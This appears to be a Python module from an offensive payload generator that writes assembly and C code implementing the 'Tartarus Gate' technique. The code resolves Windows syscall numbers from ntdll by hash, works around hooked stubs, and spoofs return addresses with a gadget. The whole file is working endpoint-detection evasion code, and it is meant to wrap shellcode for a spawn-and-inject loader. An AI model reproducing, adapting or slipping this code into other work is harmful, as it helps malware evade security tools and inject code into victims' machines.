import random
import string
import tempfile
import os
import subprocess
from c.utils.typedefs import typedefs

class tartarusgatehashrap:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        fd, file_path = tempfile.mkstemp(suffix='.asm')
        self.outfd, self.outfile_path = tempfile.mkstemp(suffix='.o')
        self.typedefs = typedefs
        self.apicalls = {}
        with os.fdopen(fd, 'w') as f:
            inline_assembly = """
default rel

global wSystemCall
global HellsGate
global HellDescent

extern gadget

section .data
    wSystemCall dd 000h
    return_address dq 000h
    r12_value dq 000h

section .text

HellsGate:
    mov [wSystemCall], ecx
    nop
    nop
    nop
    ret

HellDescent:
    mov r10, rcx 
    mov rcx, [rsp]
    mov [r12_value], r12
    mov [return_address], rcx
    mov rcx, [gadget]
    mov [rsp], rcx
    mov rax, [wSystemCall] 
    lea r12, Finish
    syscall
    ret
Finish:
    mov rcx, [return_address]
    mov [rsp], rcx
    mov r12, [r12_value]
    ret

"""
            f.write(inline_assembly)
        result = subprocess.run(['nasm', '-f', 'win64', file_path, '-o', self.outfile_path])
        if result.returncode == 0:
            print(f'Tartarus Gate Object File saved to {self.outfile_path}')
        os.unlink(file_path)
        os.close(self.outfd)

    def imports(self) -> list[str]:
        return ['#include <windows.h>',
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return [self.outfile_path]
    
    def codeblocks(self) -> str:
        ntdll = []
        codeblock = """
extern VOID HellsGate(WORD wSystemCall);
extern NTSTATUS HellDescent(...);

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

#define UP -32
#define DOWN 32

DWORD GetSSN(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, DWORD64 functionHash) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
		if (djb2(pczFunctionName) == functionHash) {

			// First opcodes should be :
			//    MOV R10, RCX
			//    MOV RAX, <syscall>
			if (*((PBYTE)pFunctionAddress) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6) == 0x00
				&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

				BYTE high = *((PBYTE)pFunctionAddress + 5);
				BYTE low = *((PBYTE)pFunctionAddress + 4);
				return (high << 8) | low;
			}
			 //if hooked check the neighborhood to find clean syscall
			if (*((PBYTE)pFunctionAddress) == 0xe9) {
				for (WORD idx = 1; idx <= 500; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						return (high << 8) | low - idx;
					}
					// check neighboring syscall up
					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						return (high << 8) | low + idx;
					}

				}
				return 0;
			}
			if (*((PBYTE)pFunctionAddress + 3) == 0xe9) {
				for (WORD idx = 1; idx <= 500; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
						return (high << 8) | low - idx;
					}
					// check neighboring syscall up
					if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
						return (high << 8) | low + idx;
					}

				}
				return 0;
			}
		}
	}

	return 0;
}

BOOLEAN FindGadget( PBYTE Module, LPSTR GadgetBytes, PVOID* GadgetAddr )
{
    if ( !GadgetAddr ) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS  NT   = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    PVOID              Base = (PVOID)(Module + IMAGE_FIRST_SECTION( NT )->VirtualAddress);
    DWORD              Size = (DWORD)(IMAGE_FIRST_SECTION( NT )->SizeOfRawData);
    DWORD              SzGt = (DWORD)(strlen( GadgetBytes ));
    
    // Iterate through the .text section and find a gadget
    for ( PBYTE current = Base; (void *)current <= (void *)(Base + Size-SzGt); current++ ) {
        if ( !memcmp( current, GadgetBytes, SzGt ) ) {
            *GadgetAddr = current;
            return TRUE;
        }
    }
    return FALSE;
}
"""
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt':
                ntdll.append(apicall)
            elif apicall[0:2] in ['Zw', 'Rt']:
                codeblock += f"""
{self.typedefs[apicall]}
"""

        codeblock += f"""
NTSTATUS status;

typedef struct {{
    {'\n\t'.join([f'DWORD {x}_ssn;' for x in ntdll ])}
}} Resolver;

Resolver resolver;

PVOID gadget;

__attribute__((constructor)) void {self.name}(){{

    PTEB pCurrentTeb = NULL;
    __asm__ ("mov %%gs:0x30, %0" : "=r" (pCurrentTeb));
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return;
	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory);
    {'\n\t'.join([f'resolver.{apicall}_ssn = GetSSN(pLdrDataEntry->DllBase, pImageExportDirectory, {hex(self.hash_string(apicall))});' for apicall in ntdll])}
    if ( !FindGadget( (PBYTE)GetModuleHandleA( "ntdll.dll" ), "\\x41\\xff\\xd4", &gadget ) ) {{
        printf( "We could not find a gadget!" );
        return;
    }}
}}
"""
        return codeblock

    def template(self, templateCode, transformers, shellcodeSize):
        for _, field_name, _, _ in string.Formatter().parse(templateCode):
            if field_name is not None and field_name not in ['shellcodeSize', 'transformers']:
                self.apicalls[field_name] = ''
        self.resolve()
        return templateCode.format(transformers=transformers, shellcodeSize=shellcodeSize, **self.apicalls)

    def resolve(self):
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt':
                self.apicalls[apicall] = f"""
    HellsGate(resolver.{apicall}_ssn);
    status = HellDescent"""
            elif apicall[0:2] in ['Rt', 'Zw']:
                self.apicalls[apicall] = f'(({apicall}_t)GetProcAddress(LoadLibrary(TEXT("ntdll.dll")), "{apicall}"))'
            else:
                self.apicalls[apicall] = apicall
    
    def hash_string(self, functionName):
        hash = 0x7734773477347734
        for character in functionName:
            hash = ((hash << 0x5) + hash) + ord(character) 

        return hash & 0xffffffffffffffff